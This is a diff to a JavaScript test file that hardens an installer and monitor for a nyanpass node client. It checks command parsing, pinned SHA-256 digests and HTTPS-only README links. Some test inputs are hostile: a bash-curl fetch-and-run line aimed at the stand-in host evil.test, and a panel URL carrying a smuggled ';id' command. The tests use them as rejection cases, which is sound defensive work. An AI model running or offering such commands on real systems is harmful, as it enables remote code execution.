@@ -25,8 +25,8 @@ function handler(source, method, nextMethod) {
 }
 
 test('official command parser exposes only the validated structured credential fields', () => {
-  const parsed = parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-o -t abcdefgh-1234 -u https://ny.example.test"');
-  assert.deepEqual(parsed, { ok: true, args: '-o -t abcdefgh-1234 -u https://ny.example.test', clientToken: 'abcdefgh-1234', panelUrl: 'https://ny.example.test', role: 'outbound' });
+  const parsed = parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-o -t 123e4567-e89b-42d3-a456-426614174000 -u https://ny.example.test"');
+  assert.deepEqual(parsed, { ok: true, args: '-o -t 123e4567-e89b-42d3-a456-426614174000 -u https://ny.example.test', clientToken: '123e4567-e89b-42d3-a456-426614174000', panelUrl: 'https://ny.example.test', role: 'outbound' });
   assert.equal(parseOfficialNyanpassCommand('bash <(curl -fLSs https://evil.test/x) rel_nodeclient "-t abcdefgh -u https://ny.example.test"').ok, false);
   assert.equal(parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-t abcdefgh -u https://ny.example.test;id"').ok, false);
 });
@@ -144,6 +144,7 @@ test('monitor runs a background allowlisted worker and never evaluates server-pr
   assert.match(monitor, /if ! valid_task_uuid "\$job_id" \|\| ! valid_task_lease "\$lease_token"; then[\s\S]*不会写入本地状态/);
   assert.match(monitor, /\^\[0-9a-f\]\{8\}-\[0-9a-f\]\{4\}-4/);
   assert.match(monitor, /timeout --kill-after=30s/);
+  assert.match(installScript, /timeout --kill-after=30s/);
   assert.match(monitor, /recover_local_task_state/);
   assert.match(monitor, /\.rejected/);
   assert.match(monitor, /outcome="uncertain"/);
@@ -176,6 +177,22 @@ test('probe executables use an HTTPS release plus a pinned digest', () => {
   assert.match(installScript, /MONITOR_DOWNLOAD_URL="https:\/\/[^"]+"[\s\S]*MONITOR_SHA256="[a-f0-9]{64}"/);
   const pinnedMonitorHash = installScript.match(/MONITOR_SHA256="([a-f0-9]{64})"/)?.[1];
   assert.equal(pinnedMonitorHash, createHash('sha256').update(monitor).digest('hex'));
+
+  const installerHash = monitor.match(/^NYANPASS_INSTALL_SHA256="([a-f0-9]{64})"$/m)?.[1];
+  assert.equal(installerHash, installScript.match(/^NYANPASS_INSTALL_SHA256="([a-f0-9]{64})"$/m)?.[1]);
+  for (const architecture of ['AMD64', 'AMD64V3', 'ARM64']) {
+    const pattern = new RegExp(`^NYANPASS_BINARY_${architecture}_SHA256="([a-f0-9]{64})"$`, 'm');
+    assert.equal(monitor.match(pattern)?.[1], installScript.match(pattern)?.[1]);
+  }
+  for (const source of [monitor, installScript]) {
+    assert.match(source, /verify_nyanpass_archive/);
+    assert.match(source, /stage_nyanpass_binary/);
+    assert.match(source, /write_nyanpass_start_script/);
+    assert.match(source, /NO_DOWNLOAD=1/);
+    assert.match(source, /REINSTALL="?1"?/);
+    assert.match(source, /OPTIMIZE="?\$optimize_env"?/);
+    assert.doesNotMatch(source, /download\/download\.sh/);
+  }
 });
 
 test('self-hosted panels do not serve root shell payloads', () => {
@@ -188,7 +205,7 @@ test('self-hosted panels do not serve root shell payloads', () => {
 
 test('README uses the pinned HTTPS installer and never recommends an HTTP master script', () => {
   const installerDigest = createHash('sha256').update(installScript).digest('hex');
-  assert.match(readme, /curl --proto '=https' --proto-redir '=https'[\s\S]*raw\.githubusercontent\.com\/rosalgee4-lgtm\/pulsedns-control\/release-v0\.8\.1\/public\/install\.sh/);
+  assert.match(readme, /curl --proto '=https' --proto-redir '=https'[\s\S]*raw\.githubusercontent\.com\/rosalgee4-lgtm\/pulsedns-control\/release-v0\.8\.2\/public\/install\.sh/);
   assert.ok(readme.includes(installerDigest));
   assert.doesNotMatch(readme, /curl[^\n]*http:\/\/[^\n]*(?:install|monitor|update)\.sh/);
 });
